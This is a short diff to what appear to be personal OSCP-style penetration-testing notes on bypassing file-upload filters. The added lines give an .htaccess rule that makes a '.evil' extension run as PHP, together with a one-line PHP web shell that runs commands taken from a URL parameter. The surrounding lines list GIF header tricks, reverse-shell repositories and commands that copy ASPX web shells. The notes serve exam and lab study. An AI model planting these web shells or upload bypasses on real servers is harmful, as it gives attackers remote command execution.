@@ -543,11 +543,14 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - for gifs: `GIF87a;` or `GIF89a;`
 - https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master
 - `.htaccess`: https://github.com/wireghoul/htshells
-  - Another trick
+  - Another trick from OSCP Walkthroughs
     - ```
-	  ~/Documents/scripts/.htaccess    (+)
-      ~/Documents/scripts/siren.evil
-	  ```
+      .htaccess
+      AddType application/x-httpd-php .evil
+      (+)
+      siren.evil
+      <pre><?php echo system($_GET['cmd']); ?></pre>
+      ```
 - for asp applications
   - `cp /usr/share/webshells/aspx/cmdasp.aspx .`
   - `cp /usr/share/laudanum/aspx/shell.aspx .`
